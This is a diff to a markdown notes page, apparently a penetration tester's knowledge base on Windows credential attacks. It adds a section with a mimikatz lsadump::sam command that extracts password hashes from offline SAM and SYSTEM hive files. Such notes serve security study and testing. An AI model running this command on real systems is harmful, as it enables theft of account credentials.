@@ -61,6 +61,11 @@ public:: true
 	- {{embed ((65a69974-9c42-41df-909e-67d73e121db1))}}
 - Golden Ticket
 	- {{embed ((65a7d51a-e45d-454a-b4fd-7f314589d634))}}
+- SAM and SYSTEM
+	- It might happen that you have access to SAM and SYSTEM files. With mimikatz you can process them without administration privileges by specifying their location.
+	  ```mimikatz
+	  lsadump::sam /sam:C:\windows.old\windows\system32\SAM /system:C:\windows.old\windows\system32\system
+	  ```
 - Certificates
   id:: 655b7624-0ef9-481b-96a1-2aa762c3f0dd
 	- Certificates' private keys are also stored in the LSASS process' memory. As [mentioned here](((655b76db-6fdf-470e-9bea-1d662dcfd6c1))), certificates may be marked as having a non-exportable private key.
